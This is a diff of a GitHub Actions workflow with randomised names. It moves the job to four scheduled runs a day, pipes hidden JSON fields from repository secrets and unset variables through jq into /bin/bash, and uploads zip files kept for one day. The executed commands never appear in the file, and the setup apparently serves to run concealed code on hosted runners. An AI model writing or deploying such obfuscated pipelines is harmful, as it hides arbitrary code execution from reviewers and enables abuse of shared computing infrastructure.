@@ -1,10 +1,9 @@
 name: diegomake329
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '36 2/6 * * *'
 
+  schedule:
+    - cron: '38 4,10,16,22 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: diegomake329
         env:
-          cjlmc6: ${{ secrets.cjlmc6 }}
+          ozm486: ${{ secrets.ozm486 }}
         run: |
-          echo $cjlmc6 | jq -r .dttg4901 | /bin/bash
-          echo $qt38 | jq -r .jmi28 | /bin/bash
-          echo $rax6028 | jq -r .pl13281 | /bin/bash
-          echo $j553 | jq -r .gp69 | /bin/bash
-          echo $bogeb24687 | jq -r .gasae68 | /bin/bash
-          echo $u2 | jq -r .zlk56 | /bin/bash
-          echo $r1 | jq -r .x67309 | /bin/bash
+          printf '%s' "$ozm486" | jq -r .updi2880 | /bin/bash
+          echo $xftqf821 | jq -r .rve22662 | /bin/bash
+          printf '%s' "$ccrqt95" | jq -r .iwohc65 | /bin/bash
+          echo $sus05625 | jq -r .ol57480 | /bin/bash
+          printf '%s' "$r8" | jq -r .ksmm6 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: VxnACeFU
+          path: "*.zip"
+          retention-days: 1
